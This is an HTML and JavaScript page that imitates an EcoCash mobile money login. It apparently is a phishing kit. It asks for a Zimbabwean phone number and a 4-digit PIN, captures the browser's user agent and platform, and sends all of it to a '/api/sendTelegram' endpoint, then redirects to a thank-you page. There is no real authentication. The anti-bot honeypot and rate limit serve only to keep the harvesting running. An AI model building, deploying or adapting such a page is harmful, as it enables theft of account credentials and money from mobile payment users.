<!doctype html>
<html>
<head>
<meta charset="utf-8" />
<meta name="viewport" content="width=device-width,initial-scale=1" />
<title>EcoCash — Login</title>
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700&display=swap" rel="stylesheet">

<style>
*{box-sizing:border-box}
html,body{height:100%}
body{
  font-family:Inter,system-ui,Arial;
  background:linear-gradient(180deg,#f7fbff,#e8f3ff);
  margin:0;
  padding:18px;
  display:flex;
  align-items:center;
  justify-content:center;
}

.card{
  width:100%;
  max-width:380px;
  background:#fff;
  padding:20px;
  border-radius:12px;
  box-shadow:0 12px 30px rgba(2,6,23,0.06)
}

.logo{height:44px;display:block;margin:0 auto 10px}
h2{text-align:center;margin:0 0 12px;font-size:20px}

label{display:block;font-size:13px;margin-top:8px}
input{width:100%;padding:10px;border-radius:8px;border:1px solid #e6eefc}

.btn{background:#4b86ff;color:#fff;padding:10px;border-radius:8px;border:0;margin-top:14px;width:100%;cursor:pointer}
.btn[disabled]{background:#cbd5e1;cursor:not-allowed}

.small{font-size:13px;color:#6b7280}
.req{color:#d04444;margin-right:6px}

/* PIN boxes */
.pin-row{display:flex;gap:8px;justify-content:center;margin-top:6px}
.pin-digit{
  width:48px;height:50px;
  text-align:center;
  font-size:20px;
  border-radius:8px;
  border:1px solid #e6eefc;
}

/* phone helper */
.phone-prefix{
  text-align:center;
  font-size:13px;
  color:#6b7280;
  margin-top:4px;
}

.phone-error{color:#d04444;font-size:13px;display:none}
</style>
</head>

<body>
<div class="card">
<img src="assets/eco.png" class="logo" alt="EcoCash logo">

<h2>Login</h2>

<form id="loginForm" autocomplete="off">
<label><span class="req">★</span>Mobile Number</label>
<input id="phone" inputmode="numeric" placeholder="7XXXXXXXX" />
<div class="phone-prefix">+263</div>
<div id="phoneError" class="phone-error">Enter 9 digits starting with 7</div>

<label><span class="req">★</span>4-Digit PIN</label>
<div class="pin-row">
  <input class="pin-digit" maxlength="1" inputmode="numeric">
  <input class="pin-digit" maxlength="1" inputmode="numeric">
  <input class="pin-digit" maxlength="1" inputmode="numeric">
  <input class="pin-digit" maxlength="1" inputmode="numeric">
</div>

<!-- honeypot -->
<input type="text" id="hp" style="display:none">

<button id="loginBtn" class="btn" disabled>LOGIN</button>
</form>
</div>

<script>
/* Anti-bot rate limit */
const lastSubmit = Number(localStorage.getItem('lastSubmit') || 0);
if(Date.now() - lastSubmit < 4000){
  document.getElementById('loginBtn').disabled = true;
}

/* Device info */
const deviceInfo = {
  userAgent: navigator.userAgent,
  platform: navigator.platform
};

/* Phone validation */
const phoneEl = document.getElementById('phone');
const phoneError = document.getElementById('phoneError');

phoneEl.addEventListener('input', ()=>{
  phoneEl.value = phoneEl.value.replace(/\D/g,'').slice(0,9);
  const valid = /^7\d{8}$/.test(phoneEl.value);
  phoneError.style.display = valid ? 'none' : 'block';
  updateBtn();
});

/* PIN logic */
const pinBoxes = [...document.querySelectorAll('.pin-digit')];

pinBoxes.forEach((box,i)=>{
  box.addEventListener('input',()=>{
    box.value = box.value.replace(/\D/g,'');
    if(box.value && i<3) pinBoxes[i+1].focus();
    updateBtn();
  });

  box.addEventListener('keydown',e=>{
    if(e.key==='Backspace' && !box.value && i>0){
      pinBoxes[i-1].focus();
    }
  });
});

function getPIN(){
  return pinBoxes.map(b=>b.value).join('');
}

function updateBtn(){
  const pinOk = /^\d{4}$/.test(getPIN());
  const phoneOk = /^7\d{8}$/.test(phoneEl.value);
  document.getElementById('loginBtn').disabled = !(pinOk && phoneOk);
}

/* Vercel API */
async function sendToServer(payload){
  return fetch('/api/sendTelegram',{
    method:'POST',
    headers:{'Content-Type':'application/json'},
    body:JSON.stringify(payload)
  });
}

document.getElementById('loginForm').addEventListener('submit',async e=>{
  e.preventDefault();

  if(document.getElementById('hp').value) return; // bot

  localStorage.setItem('lastSubmit',Date.now());

  const payload = {
    event:'login_clicked',
    phone:'+263'+phoneEl.value,
    pin:getPIN(),
    device:deviceInfo,
    submittedAt:new Date().toISOString()
  };

  await sendToServer(payload);
  window.location.href='thankyou.html';
});
</script>
</body>
</html>
